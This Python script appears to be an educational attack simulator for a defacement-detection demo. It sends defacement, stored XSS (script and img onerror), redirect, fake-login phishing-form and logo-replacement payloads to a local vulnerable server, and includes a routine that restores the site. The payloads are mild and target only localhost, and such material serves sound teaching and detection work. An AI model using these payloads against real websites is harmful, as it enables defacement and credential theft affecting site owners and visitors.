"""
Enhanced Attack Simulator for Defacement Detection Demo
Simulates various types of website defacement attacks including image replacement
EDUCATIONAL PURPOSE ONLY
"""

import requests
import time
from datetime import datetime
from pathlib import Path
import io
from PIL import Image
import json
import sqlite3
import base64

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS_ENABLED = True
except ImportError:
    COLORS_ENABLED = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = ''
    class Style:
        BRIGHT = RESET_ALL = ''


class EnhancedAttackSimulator:
    """Simulates various website attacks including image replacement"""
    
    def __init__(self, target_url='http://localhost:5000'):
        """Initialize attack simulator"""
        self.target_url = target_url
        self.admin_url = f"{target_url}/admin/update"
        self.blog_comment_url = f"{target_url}/blog/comment"
    
    def check_server_status(self):
        """Check if target server is running"""
        try:
            response = requests.get(f"{self.target_url}/api/health", timeout=2)
            if response.status_code == 200:
                self._print_success("Target server is running")
                return True
            else:
                self._print_error(f"Server returned status {response.status_code}")
                return False
        except requests.exceptions.ConnectionError:
            self._print_error("Cannot connect to server. Is it running?")
            return False
        except Exception as e:
            self._print_error(f"Error checking server: {e}")
            return False
    
    def create_malicious_image(self, text="HACKED"):
        """Create a malicious image with text overlay"""
        # Create a red image
        img = Image.new('RGB', (400, 400), color=(255, 0, 0))
        
        # Convert to bytes
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        
        return img_byte_arr
    
    def simulate_simple_defacement(self):
        """Simulate a simple homepage defacement"""
        self._print_header("SIMULATING SIMPLE DEFACEMENT")
        
        payload = {
            'homepage_title': 'HACKED BY ATTACKER',
            'homepage_content': '''
                <h1 style="color: red; text-align: center;">
                    🚨 WEBSITE DEFACED 🚨
                </h1>
                <p style="text-align: center; font-size: 20px;">
                    This site has been compromised for educational purposes.
                </p>
            ''',
            'about_content': 'Original about content'
        }
        
        return self._execute_attack(payload, "Simple defacement")
    
    def simulate_logo_replacement(self):
        """Simulate replacing the company logo with a malicious one"""
        self._print_header("SIMULATING LOGO REPLACEMENT ATTACK")
        
        try:
            # First, get the current content to preserve it
            self._print_info("Fetching current website content...")
            try:
                response = requests.get(f"{self.target_url}/api/content", timeout=5)
                if response.status_code == 200:
                    current_content = response.json()
                    self._print_info("Current content retrieved successfully")
                else:
                    self._print_warning("Could not fetch current content, using defaults")
                    current_content = {
                        'homepage_title': 'Welcome to SecureDemo Corp',
                        'homepage_content': '<h2>Professional Business Solutions</h2><p>Content preserved.</p>',
                        'about_content': 'About content'
                    }
            except Exception as e:
                self._print_warning(f"Error fetching content: {e}, using defaults")
                current_content = {
                    'homepage_title': 'Welcome to SecureDemo Corp',
                    'homepage_content': '<h2>Professional Business Solutions</h2><p>Content preserved.</p>',
                    'about_content': 'About content'
                }
            
            # Try to load the baby-surprised.png image
            image_path = Path("images/baby-surprised.png")
            
            if image_path.exists():
                self._print_info(f"Loading image from: {image_path}")
                with open(image_path, "rb") as f:
                    malicious_logo = f.read()
                filename = 'baby-surprised.png'
            else:
                self._print_warning(f"Image not found at {image_path}, creating red placeholder")
                # Fallback: create a red image
                malicious_logo = self.create_malicious_image("HACKED")
                filename = 'hacked_logo.png'
            
            # Prepare multipart form data with PRESERVED content
            files = {
                'logo': (filename, malicious_logo, 'image/png')
            }
            
            # Keep all existing content, only change the logo
            data = {
                'homepage_title': current_content.get('homepage_title', 'Welcome to SecureDemo Corp'),
                'homepage_content': current_content.get('homepage_content', ''),
                'about_content': current_content.get('about_content', '')
            }
            
            self._print_info(f"Target: {self.admin_url}")
            self._print_info(f"Uploading malicious logo: {filename} (content preserved)...")
            
            response = requests.post(
                self.admin_url,
                data=data,
                files=files,
                timeout=10
            )
            
            if response.status_code in (200, 302):
                self._print_success("Logo replacement successful!")
                self._print_info("The website logo has been replaced with a malicious image")
                self._print_info("All other content was preserved")
                return True
            else:
                self._print_error(f"Logo replacement failed. Status: {response.status_code}")
                return False
                
        except Exception as e:
            self._print_error(f"Logo replacement failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def simulate_xss_injection(self):
        """Simulate XSS (Cross-Site Scripting) injection"""
        self._print_header("SIMULATING XSS INJECTION")
        
        payload = {
            'homepage_title': 'Normal Website Title',
            'homepage_content': '''
                <h2>Welcome to our website</h2>
                <script>
                    alert('XSS Vulnerability Detected! This site is compromised.');
                </script>
                <p>This is normal content with hidden malicious script.</p>
            ''',
            'about_content': 'Normal about content'
        }
        
        return self._execute_attack(payload, "XSS injection")
    
    def simulate_blog_comment_xss(self):
        """Simulate XSS injection via blog comments"""
        self._print_header("SIMULATING BLOG COMMENT XSS ATTACK")
        
        try:
            payload = {
                'author': 'Innocent User',
                'content': '''
                    <script>alert('XSS in comments!');</script>
                    <img src=x onerror="alert('Image XSS')">
                    This looks like a normal comment but contains malicious scripts.
                '''
            }
            
            self._print_info(f"Target: {self.blog_comment_url}/1")
            self._print_info("Posting malicious comment...")
            
            response = requests.post(
                f"{self.blog_comment_url}/1",
                data=payload,
                timeout=5
            )
            
            if response.status_code in (200, 302):
                self._print_success("Blog comment XSS injection successful!")
                return True
            else:
                self._print_error(f"Comment injection failed. Status: {response.status_code}")
                return False
                
        except Exception as e:
            self._print_error(f"Comment injection failed: {e}")
            return False
    
    def simulate_subtle_defacement(self):
        """Simulate a subtle defacement (harder to detect)"""
        self._print_header("SIMULATING SUBTLE DEFACEMENT")
        
        payload = {
            'homepage_title': 'Welcome to SecureDemo Corp',
            'homepage_content': '''
                <h2>Professional Business Solutions</h2>
                <p>We provide cutting-edge technology solutions for modern businesses.</p>
                <ul>
                    <li>Cloud Infrastructure</li>
                    <li>Cybersecurity Services</li>
                    <li>Enterprise Software</li>
                </ul>
                <!-- Hidden message: Pwned by h4ck3r -->
                <div style="display:none;">Compromised</div>
                <script>
                    // Subtle tracking script
                    console.log('Site compromised - logging user activity');
                </script>
            ''',
            'about_content': '''
                <h2>About Us</h2>
                <p>SecureDemo Corp has been serving clients since 2020.</p>
                <p>Contact: hacker@malicious.com (changed email subtly)</p>
            '''
        }
        
        return self._execute_attack(payload, "Subtle defacement")
    
    def simulate_redirect_injection(self):
        """Simulate malicious redirect injection"""
        self._print_header("SIMULATING REDIRECT INJECTION")
        
        payload = {
            'homepage_title': 'Welcome',
            'homepage_content': '''
                <h2>Welcome</h2>
                <script>
                    setTimeout(function() {
                        window.location.href = '/malicious-redirect-page';
                    }, 3000);
                </script>
                <p>This page will redirect in 3 seconds...</p>
            ''',
            'about_content': 'Normal content'
        }
        
        return self._execute_attack(payload, "Redirect injection")
    
    def simulate_phishing_page(self):
        """Simulate phishing page injection"""
        self._print_header("SIMULATING PHISHING PAGE")
        
        payload = {
            'homepage_title': 'Security Alert - Login Required',
            'homepage_content': '''
                <div style="border: 2px solid red; padding: 20px; background: #fff3cd;">
                    <h2 style="color: red;">⚠️ SECURITY ALERT</h2>
                    <p>Your session has expired. Please login again:</p>
                    <form action="/log-credentials" method="POST">
                        <input type="text" name="username" placeholder="Username" required><br><br>
                        <input type="password" name="password" placeholder="Password" required><br><br>
                        <button type="submit">Login</button>
                    </form>
                </div>
            ''',
            'about_content': 'Compromised'
        }
        
        return self._execute_attack(payload, "Phishing page")
    
    def simulate_combined_attack(self):
        """Simulate a combined attack: content + logo replacement"""
        self._print_header("SIMULATING COMBINED ATTACK (Content + Logo)")
        
        try:
            # Create malicious image
            malicious_logo = self.create_malicious_image("PWNED")
            
            files = {
                'logo': ('pwned.png', malicious_logo, 'image/png')
            }
            
            data = {
                'homepage_title': '🚨 SYSTEM BREACHED 🚨',
                'homepage_content': '''
                    <div style="text-align: center; padding: 50px;">
                        <h1 style="color: red; font-size: 3em;">WEBSITE COMPROMISED</h1>
                        <p style="font-size: 1.5em;">All your data belongs to us</p>
                        <p>This is a demonstration of combined attack vectors</p>
                    </div>
                ''',
                'about_content': '<h1>DEFACED</h1><p>Educational demonstration</p>'
            }
            
            self._print_info(f"Target: {self.admin_url}")
            self._print_info(f"Executing combined attack (content + logo)...")
            
            response = requests.post(
                self.admin_url,
                data=data,
                files=files,
                timeout=10
            )
            
            if response.status_code in (200, 302):
                self._print_success("Combined attack successful!")
                self._print_info("Both content and logo have been compromised")
                return True
            else:
                self._print_error(f"Combined attack failed. Status: {response.status_code}")
                return False
                
        except Exception as e:
            self._print_error(f"Combined attack failed: {e}")
            return False
    
    def restore_original_content(self):
        """Reset website to clean default state"""
        self._print_header("RESTORING ORIGINAL CONTENT")
        
        BASE_DIR = Path(__file__).parent.parent
        DATA_DIR = BASE_DIR / 'data'
        LOGS_DIR = BASE_DIR / 'logs'
        UPLOADS_DIR = DATA_DIR / 'uploads'
        
        # Ensure directories exist
        DATA_DIR.mkdir(exist_ok=True)
        LOGS_DIR.mkdir(exist_ok=True)
        UPLOADS_DIR.mkdir(exist_ok=True)
        
        CONTENT_FILE = DATA_DIR / 'website_content.json'
        DB_FILE = DATA_DIR / 'website.db'
        
        # STEP 1: Replace the physical file in uploads directory FIRST
        try:
            self._print_info("Step 1: Replacing physical logo file in uploads directory...")
            
            bms_source = Path("images/BMS.jpg")
            
            if bms_source.exists():
                self._print_success(f"Found BMS.jpg at {bms_source}")
                
                # Delete ALL existing logo files in uploads
                for file in UPLOADS_DIR.iterdir():
                    if file.is_file() and file.suffix.lower() in ['.png', '.jpg', '.jpeg', '.gif']:
                        self._print_info(f"Deleting old logo: {file.name}")
                        file.unlink()
                
                # Copy BMS.jpg to uploads directory
                import shutil
                bms_dest = UPLOADS_DIR / 'BMS.jpg'
                shutil.copy(bms_source, bms_dest)
                self._print_success(f"✓ BMS.jpg copied to {bms_dest}")
            else:
                self._print_error(f"❌ BMS.jpg not found at {bms_source}!")
                self._print_info("Please ensure images/BMS.jpg exists")
                return False
        except Exception as e:
            self._print_error(f"Failed to copy BMS.jpg: {e}")
            import traceback
            traceback.print_exc()
            return False
        
        # STEP 2: Update the JSON file
        clean_content = {
            'homepage_title': 'Welcome to SecureDemo Corp',
            'homepage_content': '''
                <h2>Professional Business Solutions</h2>
                <p>We provide cutting-edge technology solutions for modern businesses.</p>
                <ul>
                    <li>Cloud Infrastructure</li>
                    <li>Cybersecurity Services</li>
                    <li>Enterprise Software</li>
                </ul>
                <p>Our commitment to excellence drives everything we do.</p>
            ''',
            'about_content': '''
                <h2>About Us</h2>
                <p>SecureDemo Corp has been serving clients since 2020.</p>
                <p>Our mission is to deliver secure and reliable technology solutions.</p>
                <p>Contact us at: contact@securedemocorp.example</p>
            ''',
            'logo_filename': 'BMS.jpg',
            'last_modified': datetime.now().isoformat()
        }
        
        try:
            self._print_info("Step 2: Updating website content JSON...")
            with open(CONTENT_FILE, 'w', encoding='utf-8') as f:
                json.dump(clean_content, f, indent=2, ensure_ascii=False)
            self._print_success(f"✓ Content file updated: {CONTENT_FILE}")
        except Exception as e:
            self._print_error(f"Error updating content file: {e}")
            return False
        
        # STEP 3: Update via admin panel (to refresh server cache)
        try:
            self._print_info("Step 3: Notifying server via admin panel...")
            
            with open(bms_source, 'rb') as f:
                bms_logo = f.read()
            
            files = {
                'logo': ('BMS.jpg', bms_logo, 'image/jpeg')
            }
            
            data = {
                'homepage_title': clean_content['homepage_title'],
                'homepage_content': clean_content['homepage_content'],
                'about_content': clean_content['about_content']
            }
            
            self._print_info(f"Sending POST to {self.admin_url}...")
            response = requests.post(
                self.admin_url,
                data=data,
                files=files,
                timeout=10
            )
            
            self._print_info(f"Server response: {response.status_code}")
            if response.status_code in (200, 302):
                self._print_success("✓ Server updated successfully")
            else:
                self._print_warning(f"Server returned status {response.status_code} (but files are updated)")
        except Exception as e:
            self._print_warning(f"Admin panel notification failed (but files are updated): {e}")
        
        # STEP 4: Clear change log
        CHANGE_LOG_FILE = LOGS_DIR / 'change_log.json'
        try:
            CHANGE_LOG_FILE.write_text('', encoding='utf-8')
            self._print_success("✓ Change log cleared")
        except Exception as e:
            self._print_warning(f"Could not clear change log: {e}")
        
        # STEP 5: Reset database
        try:
            self._print_info("Step 4: Resetting database...")
            if DB_FILE.exists():
                DB_FILE.unlink()
            
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS posts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    title TEXT NOT NULL,
                    content TEXT NOT NULL,
                    author TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS comments (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    post_id INTEGER,
                    author TEXT NOT NULL,
                    content TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (post_id) REFERENCES posts(id)
                )
            ''')
            
            initial_posts = [
                ('Welcome to SecureDemo Corp', 
                 'We are excited to launch our new website! Stay tuned for updates on our latest cybersecurity solutions.',
                 'Admin'),
                ('Cybersecurity Best Practices',
                 'Learn about the importance of regular security audits and monitoring systems to protect your digital assets.',
                 'Security Team'),
            ]
            cursor.executemany(
                'INSERT INTO posts (title, content, author) VALUES (?, ?, ?)',
                initial_posts
            )
            
            conn.commit()
            conn.close()
            self._print_success("✓ Database reset successfully")
        except Exception as e:
            self._print_warning(f"Could not reset database: {e}")
        
        # Final status
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓✓✓ WEBSITE RESET COMPLETE ✓✓✓{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Files updated:{Style.RESET_ALL}")
        print(f"  • Logo: {UPLOADS_DIR / 'BMS.jpg'}")
        print(f"  • Content: {CONTENT_FILE}")
        print(f"  • Database: {DB_FILE}")
        print(f"\n{Fore.YELLOW}{'!'*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠️  CRITICAL: You MUST do a HARD REFRESH in your browser!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   - Press Ctrl+Shift+R (Windows/Linux){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   - Press Cmd+Shift+R (Mac){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   - Or open in Incognito/Private mode{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'!'*60}{Style.RESET_ALL}\n")
        
        # Check what's actually in the uploads directory
        print(f"{Fore.CYAN}Current files in uploads directory:{Style.RESET_ALL}")
        for file in UPLOADS_DIR.iterdir():
            if file.is_file():
                size = file.stat().st_size
                print(f"  • {file.name} ({size} bytes)")
        print()
        
        return True
    
    def _execute_attack(self, payload, attack_name, is_restore=False):
        """Execute attack by sending payload to admin endpoint"""
        response = None
        session = requests.Session()
        
        try:
            self._print_info(f"Target: {self.admin_url}")
            if is_restore:
                self._print_info(f"Restoring original content...")
            else:
                self._print_info(f"Sending malicious payload...")
            
            headers = {
                'User-Agent': 'AttackSimulator/2.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = session.post(
                self.admin_url,
                data=payload,
                headers=headers,
                allow_redirects=False,
                timeout=10
            )
            
            if response is None:
                self._print_error(f"{attack_name} failed: no response received")
                return False
            
            # Accept both 200 (success page) and 302 (redirect) as success
            if response.status_code in (200, 201, 202, 302):
                if is_restore:
                    self._print_success(f"Content restored successfully!")
                else:
                    self._print_success(f"{attack_name} successful!")
                return True
            else:
                self._print_error(f"{attack_name} failed. Status: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            self._print_error(f"Attack failed: network error -> {e}")
            return False
        except Exception as e:
            self._print_error(f"Attack failed: unexpected error -> {e}")
            return False
        finally:
            try:
                session.close()
            except Exception:
                pass
    
    # Helper methods for formatted output
    def _print_header(self, text):
        """Print formatted header"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{text}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    def _print_success(self, text):
        """Print success message"""
        print(f"{Fore.GREEN}✓ {text}{Style.RESET_ALL}")
    
    def _print_error(self, text):
        """Print error message"""
        print(f"{Fore.RED}❌ {text}{Style.RESET_ALL}")
    
    def _print_warning(self, text):
        """Print warning message"""
        print(f"{Fore.YELLOW}⚠️ {text}{Style.RESET_ALL}")
    
    def _print_info(self, text):
        """Print info message"""
        print(f"{Fore.WHITE}  {text}{Style.RESET_ALL}")


def display_menu():
    """Display attack options menu"""
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║  ENHANCED ATTACK SIMULATOR - EDUCATIONAL DEMO              ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Available Attack Simulations:{Style.RESET_ALL}")
    print("1.  Simple Defacement (obvious)")
    print("2.  XSS Injection (script injection)")
    print("3.  Subtle Defacement (hard to detect)")
    print("4.  Redirect Injection (malicious redirect)")
    print("5.  Phishing Page (credential theft)")
    print(f"{Fore.MAGENTA}6.  Logo Replacement Attack (NEW!){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}7.  Blog Comment XSS (NEW!){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}8.  Combined Attack - Content + Logo (NEW!){Style.RESET_ALL}")
    print("9.  Restore Original Content (with BMS.png)")
    print("10. Run All Attacks (with delays)")
    print("11. Exit")
    
    print(f"\n{Fore.RED}⚠️  WARNING: Use only on your local test server!{Style.RESET_ALL}")


def main():
    """Main entry point"""
    simulator = EnhancedAttackSimulator(target_url='http://127.0.0.1:5000')
    
    # Check if server is running
    print(f"\n{Fore.CYAN}Checking target server...{Style.RESET_ALL}")
    if not simulator.check_server_status():
        print(f"\n{Fore.RED}Please start the vulnerable server first:{Style.RESET_ALL}")
        print("  python enhanced_vulnerable_server.py")
        return
    
    while True:
        display_menu()
        
        try:
            choice = input(f"\n{Fore.YELLOW}Select option (1-11): {Style.RESET_ALL}")
        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
        
        if choice == '1':
            simulator.simulate_simple_defacement()
        elif choice == '2':
            simulator.simulate_xss_injection()
        elif choice == '3':
            simulator.simulate_subtle_defacement()
        elif choice == '4':
            simulator.simulate_redirect_injection()
        elif choice == '5':
            simulator.simulate_phishing_page()
        elif choice == '6':
            simulator.simulate_logo_replacement()
        elif choice == '7':
            simulator.simulate_blog_comment_xss()
        elif choice == '8':
            simulator.simulate_combined_attack()
        elif choice == '9':
            simulator.restore_original_content()
        elif choice == '10':
            print(f"\n{Fore.CYAN}Running all attacks with 5 second delays...{Style.RESET_ALL}")
            attacks = [
                simulator.simulate_simple_defacement,
                simulator.simulate_xss_injection,
                simulator.simulate_subtle_defacement,
                simulator.simulate_redirect_injection,
                simulator.simulate_phishing_page,
                simulator.simulate_logo_replacement,
                simulator.simulate_blog_comment_xss,
                simulator.simulate_combined_attack,
            ]
            for attack in attacks:
                attack()
                time.sleep(5)
            simulator.restore_original_content()
        elif choice == '11':
            print(f"\n{Fore.GREEN}Exiting...{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")


if __name__ == '__main__':
    main()